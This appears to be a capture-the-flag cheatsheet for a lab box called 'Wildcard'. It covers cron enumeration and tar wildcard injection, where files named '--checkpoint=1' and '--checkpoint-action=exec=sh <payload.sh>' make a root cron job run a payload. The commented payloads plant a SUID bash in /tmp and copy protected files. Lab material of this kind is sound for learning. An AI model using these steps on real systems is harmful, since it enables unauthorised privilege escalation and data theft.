# Cheatsheet — Wildcard

## Targets

- **cron01** — SSH + an open backup share + an aggressive schedule

## Useful commands

```bash
curl http://<cron01>/                      # the backup share is web-readable
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.hourly/
crontab -l; systemctl list-timers --all

# filenames as arguments — end-of-options discipline for yourself
cd <archived-dir>
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh <payload.sh>'

# payload shapes people use
#   cp /bin/bash /tmp/rbash && chmod +s /tmp/rbash    — suid shell
#   cp <protected-file> /tmp/ && chmod 644 /tmp/<f>   — direct grab
```

## Concepts

- `cmd *` expands to *filenames* — and names starting with `-` are treated as
  OPTIONS by most GNU tools
- `tar --checkpoint-action=exec=` runs a command mid-archive; a single
  checkpoint at position 1 is enough
- The writable surface is the *directory*, not the script — you don't need
  to modify root's code to change what it does
